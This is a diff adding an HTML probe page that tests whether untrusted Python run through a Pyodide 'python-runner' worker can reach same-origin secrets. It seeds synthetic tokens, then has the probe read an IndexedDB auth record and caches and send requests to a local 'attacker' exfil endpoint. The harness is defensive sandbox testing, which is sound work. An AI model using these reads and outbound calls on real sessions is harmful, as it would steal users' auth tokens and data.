@@ -1,0 +1,84 @@
+<!doctype html><meta charset="utf-8"><title>CURRENT architecture probe</title>
+<body style="font:13px monospace"><h3>CURRENT architecture: real python-runner.ts bundle (Blob worker, same origin)</h3>
+<button id="go">run probes</button><pre id="out">idle</pre>
+<script src="python-runner.bundle.js"></script>
+<script>
+// Seed synthetic same-origin state that a real session would have (cookie set by server; IndexedDB + Cache + localStorage here).
+async function seed() {
+  localStorage.setItem('synthetic_localStorage_secret', 'LS-SECRET');
+  await new Promise((ok, bad) => {
+    const r = indexedDB.open('firebaseLocalStorageDb', 1);
+    r.onupgradeneeded = () => r.result.createObjectStore('firebaseLocalStorage', { keyPath: 'fbase_key' });
+    r.onsuccess = () => { const tx = r.result.transaction('firebaseLocalStorage', 'readwrite'); tx.objectStore('firebaseLocalStorage').put({ fbase_key: 'firebase:authUser:SYNTHETIC', value: { refreshToken: 'SYNTHETIC-REFRESH-TOKEN' } }); tx.oncomplete = ok; };
+    r.onerror = bad;
+  });
+  const c = await caches.open('synthetic-cache'); await c.put('/x', new Response('CACHE-SECRET'));
+  await fetch('/'); // receive the HttpOnly session cookie
+}
+const PROBE = `
+import js, json
+from pyodide.ffi import to_js
+out = {}
+async def t(name, coro):
+    try:
+        out[name] = await coro
+    except Exception as e:
+        out[name] = 'BLOCKED/ERR: ' + type(e).__name__ + ': ' + str(e)[:90]
+
+async def same_origin_api():
+    r = await js.fetch('http://localhost:4173/api/whoami', to_js({'credentials': 'include'}, dict_converter=js.Object.fromEntries))
+    return await r.text()
+async def exfil_cross_origin():
+    r = await js.fetch('http://localhost:4174/exfil?stolen=hello', to_js({'mode': 'no-cors'}, dict_converter=js.Object.fromEntries))
+    return 'request sent, type=' + str(r.type)
+async def idb_list():
+    dbs = await js.indexedDB.databases()
+    return [str(d.name) for d in dbs.to_py()] if hasattr(dbs, 'to_py') else str(dbs)
+async def idb_read():
+    import asyncio
+    fut = asyncio.get_event_loop().create_future()
+    req = js.indexedDB.open('firebaseLocalStorageDb')
+    def ok(ev):
+        db = req.result
+        g = db.transaction('firebaseLocalStorage').objectStore('firebaseLocalStorage').getAll()
+        def done(e): fut.set_result(js.JSON.stringify(g.result))
+        from pyodide.ffi import create_proxy
+        g.onsuccess = create_proxy(done)
+    from pyodide.ffi import create_proxy
+    req.onsuccess = create_proxy(ok)
+    return await fut
+async def cache_keys():
+    ks = await js.caches.keys(); return list(ks.to_py())
+async def cache_read():
+    c = await js.caches.open('synthetic-cache'); r = await c.match('/x'); return await r.text()
+async def ws():
+    s = js.WebSocket.new('ws://localhost:4174/'); return 'WebSocket object created: readyState=' + str(s.readyState)
+async def xhr_sync():
+    x = js.XMLHttpRequest.new(); x.open('GET', 'http://localhost:4173/api/whoami', False); x.send(); return x.responseText
+async def nested_worker():
+    w = js.Worker.new('data:application/javascript,postMessage(1)'); return 'Worker constructor available: ' + str(w)
+async def import_scripts():
+    return 'importScripts available: ' + str(js.importScripts)
+async def local_storage():
+    return 'localStorage in worker: ' + str(js.typeof(js.localStorage)) if hasattr(js, 'localStorage') else 'localStorage not defined in worker'
+async def dyn_import():
+    r = await js.eval("import('http://localhost:4174/x.js').then(()=> 'dynamic import resolved').catch(e=> 'dynamic import: '+e.name)")
+    return str(r)
+async def micropip_net():
+    await js.pyodide_loadPackage('micropip') if hasattr(js,'pyodide_loadPackage') else None
+    return 'n/a'
+
+for name, fn in [('same_origin_api_with_cookie', same_origin_api), ('cross_origin_exfil_no_cors', exfil_cross_origin), ('indexedDB_databases', idb_list), ('indexedDB_read_synthetic_auth_record', idb_read), ('cache_keys', cache_keys), ('cache_read', cache_read), ('websocket', ws), ('xhr_sync_same_origin', xhr_sync), ('worker_constructor', nested_worker), ('importScripts', import_scripts), ('localStorage', local_storage), ('dynamic_import_cross_origin', dyn_import)]:
+    await t(name, fn())
+print(json.dumps(out, indent=1))
+`;
+document.getElementById('go').onclick = async () => {
+  const out = document.getElementById('out'); out.textContent = 'seeding…';
+  await seed(); out.textContent = 'running (Pyodide downloads ~10 MB first)…';
+  const t0 = performance.now();
+  const r = await PR.runPython(PROBE, { timeoutMs: 120000 });
+  const log = await (await fetch('http://localhost:4175/')).text();
+  out.textContent = 'ok=' + r.ok + ' elapsed=' + Math.round(performance.now() - t0) + 'ms\n' + (r.error ? 'ERROR: ' + r.error + '\n' : '') + r.output + '\n--- requests that reached the ATTACKER server ---\n' + log;
+  window.__done = true;
+};
+</script>
